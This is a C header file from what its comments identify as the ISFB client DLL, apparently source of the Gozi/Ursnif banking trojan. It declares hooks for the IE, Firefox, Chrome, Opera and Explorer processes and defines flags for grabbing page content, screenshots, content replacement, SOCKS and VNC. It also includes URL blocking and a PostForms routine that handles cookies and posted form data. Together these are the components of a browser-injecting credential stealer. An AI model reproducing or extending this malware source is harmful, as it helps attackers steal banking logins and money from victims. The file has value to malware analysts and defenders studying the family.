//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: remote.h
// $Revision: 446 $ 
// $Date: 2014-12-18 19:45:59 +0300 (Чт, 18 дек 2014) $
// description:
//	ISFB client DLL.

#pragma once 

#include "..\handle\handle.h"
#include "..\apdepack\depack.h"
						 

// Returns 0 if DLL shutdown processing
#define IsShutdown()	WaitForSingleObject(g_ShutdownEvent, 0)

//	Handle state constants
enum
{
	UNKNOWN_STATUS = 0,
	ERROR_WHILE_LOADING,
	LOADING_COMPLETE,
	DOWNLOADING,
	GOOD_CONTENT,
	EMPTY_STREAM,
	REQUEST_BLOCKED
};


//	Stream processing status
#define		STREAM_NOTHING			0
#define		STREAM_FULL_REPLACE		1
#define		STREAM_GRAB_TAGS		2
#define		STREAM_SCREENSHOT		4
#define		STREAM_CONTENT_REPLACE	8
#define		STREAM_REG_REPLACE		0x10
#define		STREAM_VIDEO			0x20
#define		STREAM_SOCKS			0x40
#define		STREAM_VNC				0x80

// Url processing status
#define		URL_STATUS_UNDEF		0
#define		URL_STATUS_ACCEPT		1
#define		URL_STATUS_REPLACE		2
#define		URL_STATUS_BLOCK		3
#define		URL_STATUS_POST_BLOCK	4


#pragma pack(push)
#pragma pack(1)
typedef struct _HANDLE_CONTEXT
{
	LPSTREAM		pStream;		// used to store currently loaded page data before returining it to a browser
	LPSTREAM		pReceiveStream;	// used to store single chunk data
	LPSTREAM		pStream1;		// used to store whole page to grub it's comtent

	PCHAR			pHeaders;		// HTTP-headers of the current request

	PVOID			Callback;		// Previouse internet callback function address (for IE only)
	LPSTR			Url;			// Current URL
	LONG			Length;			// Content length in bytes

	// Active content buffer
	PCHAR			cBuffer;		// pointer to active content buffer
	LONG			cTotal;			// total size of the buffer
	LONG			cActive;		// active size of the buffer
	LONG			ChunkSize;		// current chunk left (bytes)

	ULONG volatile	Status;			// Operation status for IE
	ULONG volatile	Flags;			// Context flags for FF

	PVOID			tCtx;			// Pointer to TRANSFER_CONTEXT structure

	HANDLE			AsyncEvent;
} HANDLE_CONTEXT, *PHANDLE_CONTEXT;
#pragma pack(pop)


// Browser specific flags
#define	CF_IE				0x100
#define	CF_FF				0x200
#define	CF_CR				0x400

#define		BROWSER_PREFIX_MASK		0x00ffffff	
#define		BROWSER_PREFIX_SIZE		3			// bytes
#define		BROWSER_PREFIX_IE		':EI'
#define		BROWSER_PREFIX_FF		':FF'
#define		BROWSER_PREFIX_CR		':RC'
#define		BROWSER_PREFIX_OP		':PO'


extern	PHANDLE_TABLE	g_HandleTable;
extern	ULONG			g_HostProcess;
extern	LPTSTR volatile	g_UserAgentStr;

ULONG		ParserGetHostProcess(VOID);
WINERROR	ParserInitHandleTable(VOID);
VOID		ParserReleaseHandleTable(VOID);
WINERROR	ParserSetHooks(VOID);
VOID		ActivateParser(LPTSTR	UserAgent);
WINERROR	ParserHookImportExport(PHOOK_DESCRIPTOR IatHooks, ULONG NumberIatHooks, PHOOK_DESCRIPTOR ExportHooks, ULONG NumberExportHooks);
LONG		ParserCheckReceiveDisableSpdy(PCHAR Buffer, LONG Length);
VOID		ParserCheckSendDisableSpdy(PCHAR Buffer, LONG Length);


WINERROR StoreVar(LPTSTR VarName, LPTSTR	VarValue);
VOID PostForms(LPTSTR pUrl, LPTSTR pHeaders, LPTSTR pIeCookie, PVOID lpData, ULONG Size, ULONG DataId, BOOL bSaveVar);
BOOL CheckContentType(LPTSTR pContentType);

BOOL	DelHandle(HANDLE h);
BOOL	ReleaseHandle(PHANDLE_CONTEXT Ctx);
PHANDLE_CONTEXT	AddHandle(HANDLE h);
PHANDLE_CONTEXT FindHandle(HANDLE h);
WINERROR MemReplace(PCHAR Buffer, ULONG	Size, PCHAR	pSearchStr, PCHAR pReplaceStr, PVOID* pOutBuf, OUT PULONG pOutSize);

BOOL	StrCutA(LPSTR Where, LPSTR A, LPSTR B);
BOOL	StrCutW(LPWSTR Where, LPWSTR A, LPWSTR B);

BOOL	ConfigCheckUrl(PCHAR pUrl);
ULONG	ConfigCheckInitUrl(PCHAR pUrl, PCHAR pReferer, BOOL IsSsl, PVOID* ptCtx);
ULONG	ConfigProcessStream(LPSTREAM pStream, LPSTREAM pGrabStream, LPSTR pUrl, BOOL IsSsl, PVOID tCtx);

WINERROR GetReplaceHeaders(PVOID Ctx, LPSTR* ppHeaders, PULONG pSize);

HRESULT	__HrLoadAllImportsForDll(LPCSTR DllName);

LPWSTR	ParserModifyCmdLineW(LPWSTR pApplicationName, LPWSTR pCommandLine);

//----- Handle support routines ---------------------------------------------------------------------------------------------

_inline PHANDLE_CONTEXT	AddHandle(HANDLE h)
{
	PHANDLE_CONTEXT Ctx;
	ASSERT(g_HandleTable);
	if (!HandleCreate(g_HandleTable, h, &Ctx))
		Ctx = NULL;
	return(Ctx);
}

_inline PHANDLE_CONTEXT FindHandle(HANDLE h)
{
	PHANDLE_CONTEXT Ctx;
	ASSERT(g_HandleTable);
	if (!HandleOpen(g_HandleTable, h, &Ctx))
		Ctx = NULL;
	return(Ctx);
}

#define DelHandle(h)		HandleClose(g_HandleTable, h, NULL)
#define ReleaseHandle(Ctx)	HandleClose(NULL, 0, CONTAINING_RECORD(Ctx, HANDLE_RECORD, Context))


// ---- Browser-specific hooking routines ------------------------------------------------------------------------------------

// IE-specific routines
WINERROR	IeSetHooks(VOID);

// FF-specific routines
WINERROR	FfSetHooks(VOID);

// CHROME-specific routines
WINERROR	CrSetHooks(VOID);

// OPERA-specific routines
WINERROR	OpSetHooks(VOID);

// Explorer-specific hooks
WINERROR	ExSetHooks(VOID);